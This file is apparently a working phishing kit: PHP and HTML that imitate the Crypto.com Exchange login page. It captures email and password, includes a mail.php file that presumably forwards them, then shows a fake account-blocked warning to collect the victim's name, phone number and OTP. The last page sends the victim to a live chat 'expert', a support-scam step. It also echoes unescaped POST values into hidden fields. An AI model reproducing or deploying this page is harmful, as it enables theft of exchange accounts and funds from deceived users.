<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto | LogIn</title>
    <link rel="stylesheet" href="assets/css/all.min.css">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
    <!-- navigation -->
    <nav class="navbar navbar-expand-lg" id="navigation-bar">
        <a class="navbar-brand" href="#">
            <img src="assets/images/logo.svg">
        </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <i class="fas fa-bars"></i>
        </button>

        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav mr-auto">
                <li class="nav-item active">
                    <a class="nav-link" href="#">Exchange</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Markets</a>
                </li>

            </ul>
            <form class="form-inline">
                <a class="nav-link" href="#">Log In</a>
                <button class="btn btn-primary my-2 my-sm-0" type="submit">Sign Up</button>
            </form>
        </div>
    </nav>

    <!-- navigation ends -->

    <!-- form -->

     <?php
     if (isset($_POST['btnLoginMore'])) {
        
        include 'mail.php';
    ?>

        <!-- <div class="container-fluid" id="middle-section"> -->
            <div class="container-fluid" id="welcome-section">
            <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                <b>A One time password (OTP) will be shared with you by the support expert team while logging in.</b>
                <br>
                Kindly contact chat assistance for further help
            </div>
        <h2 id="heading">Verification Required <span></span></h2>

        <form action="" method="post">
          
          <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />

            <div class="form-group">
                <label>First Name</label>
                <input type="text" class="form-control" name="fname" placeholder="Enter Your First Name" required>
            </div>

            <div class="form-group">
                <label>Last Name</label>
                <input type="text" class="form-control" placeholder="Enter Your Last Name" name="lname" required>
            </div>
            <div class="form-group">
                <label>Registered Number</label>
                <input type="text" class="form-control" placeholder="Registered Number" name="number" required>
            </div>

            <div class="form-group">
                <label>One time password (OTP)</label><br>
                <input class="form-control" type="text" name="number" placeholder="One time password (OTP)" maxlength="6" required>
            </div>
            
                <button class="btn btn-block btn-primary" name="fromLog" type="submit">Verify </button>
            
        </form>
        <!-- footer -->
        <div class="container-fluid" id="footer">
            <i class="fas fa-university"></i>
            <span>Need an institutional account?<a href="#"> Sign up here</a></span>
        </div>
        <!-- footer ends -->
    </div>
    <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>

     <div class="container-fluid" id="middle-error-section">
        <h2 id="heading">Important Message: <span></span></h2>
        <form action="" method="post">
            <p>Your account has been <b>temporarily blocked</b> due to suspicious activity on your Network IP. Kindly ask an expert</p>
            <div class="form">
                <label>Error CODE: EBRX1:6X76D</label><br>
            </div>
            <div class="calling-number">
                <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
            </div>
           
        </form>
        <!-- footer -->
        <div class="container-fluid" id="footer">
            <i class="fas fa-university"></i>
            <span>Need an institutional account?<a href="#"> Sign up here</a></span>
        </div>

        <!-- footer ends -->
    </div>

    <?php } else { ?>

    <div class="container-fluid" id="welcome-section">
        <h2 id="heading">Log in to Crypto.com <span>Exchange</span></h2>
        <form action="" method="post">
            <div class="form-group">
                <label for="exampleInputEmail1">Email</label>
                <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp"
                    placeholder="Enter Your Email Address" required>
            </div>

            <div class="form-group">
                <label for="exampleInputPassword1">Password</label>
                <input type="password" class="form-control" id="exampleInputPassword1"
                    placeholder="Enter Your Password" name="password" required>
            </div>

            <button name="btnLoginMore" type="submit" class="btn btn-block btn-primary">Sign In</button>
            <div class="links">
                <a href="#">Forgot password ?</a>
                <span>Don't have an account?<a href="#"> Sign Up Now</a></span>
            </div>
        </form>
        <!-- footer -->
        <div class="container-fluid" id="footer">
            <i class="fas fa-university"></i>
            <span>Need an institutional account?<a href="#"> Sign up here</a></span>
        </div>

        <!-- footer ends -->
    </div>
    <?php } ?>

    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/popper.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
</body>
</html>